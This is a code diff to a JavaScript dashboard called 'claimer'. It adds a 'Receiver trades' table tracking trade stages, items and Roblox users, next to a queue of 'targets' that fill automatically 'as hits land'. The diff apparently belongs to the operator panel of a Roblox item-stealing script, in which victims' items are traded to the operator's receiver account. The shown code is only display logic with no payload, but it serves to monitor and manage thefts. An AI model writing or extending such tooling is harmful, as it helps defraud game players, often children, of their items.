@@ -122,6 +122,23 @@ export async function claimer(root) {
 
       <div class="card">
         <div class="card-head">
+          <div><h2>Receiver trades</h2><p>What the client does when a receiver joins: request, offer, confirm.</p></div>
+          <div class="right"><span class="badge game" id="trade-count">0</span></div>
+        </div>
+        <div class="card-body" style="padding:0">
+          <div class="table-wrap">
+            <table>
+              <thead><tr>
+                <th>Time</th><th>Receiver</th><th>Stage</th><th>Items</th><th>Server</th><th>Note</th>
+              </tr></thead>
+              <tbody id="trades"><tr><td colspan="6"><div class="skeleton" style="height:70px"></div></td></tr></tbody>
+            </table>
+          </div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-head">
           <div><h2>Claim queue</h2><p>Every target the joiner knows about.</p></div>
           <div class="right"><button class="btn btn-sm" id="clear-queue">Clear finished</button></div>
         </div>
@@ -280,6 +297,29 @@ export async function claimer(root) {
         </tr>`;
       }).join('')
       : '<tr><td colspan="8"><div class="empty"><strong>Queue is empty</strong><span>Targets are added automatically as hits land.</span></div></td></tr>';
+
+    const STAGE = {
+      engine: 'game', receiver_joined: 'pending', request: 'pending', window: 'partial',
+      offer: 'partial', confirm: 'partial', waiting: 'pending', done: 'claimed', no_window: 'missed',
+    };
+    const trades = data.trades ?? [];
+    $('#trade-count').textContent = `${trades.length}`;
+    $('#trades').innerHTML = trades.length
+      ? trades.map((t) => {
+        const items = t.items ?? [];
+        return `
+        <tr>
+          <td>${stamp(t.at)}</td>
+          <td><b>${esc(t.receiver)}</b>${t.roblox_user ? `<div class="cell-sub">from ${esc(t.roblox_user)}</div>` : ''}</td>
+          <td><span class="badge ${STAGE[t.stage] ?? 'game'}">${esc(t.stage)}</span></td>
+          <td>${items.length
+            ? `<div class="chips">${items.slice(0, 5).map((i) => `<span class="chip">${esc(i)}</span>`).join('')}${items.length > 5 ? `<span class="chip">+${items.length - 5}</span>` : ''}</div>`
+            : '<span class="cell-sub">—</span>'}</td>
+          <td>${serverCell(t)}</td>
+          <td><span class="cell-sub">${esc(t.detail ?? GAMES[t.game] ?? '')}</span></td>
+        </tr>`;
+      }).join('')
+      : '<tr><td colspan="6"><div class="empty"><strong>No trade stages yet</strong><span>Add a receiver on My script, run the client, then join with that account. Every stage lands here.</span></div></td></tr>';
 
     $('#account-count').textContent = `${data.accounts.length} / ${data.engine.accounts_limit}`;
     $('#accounts').innerHTML = data.accounts.length
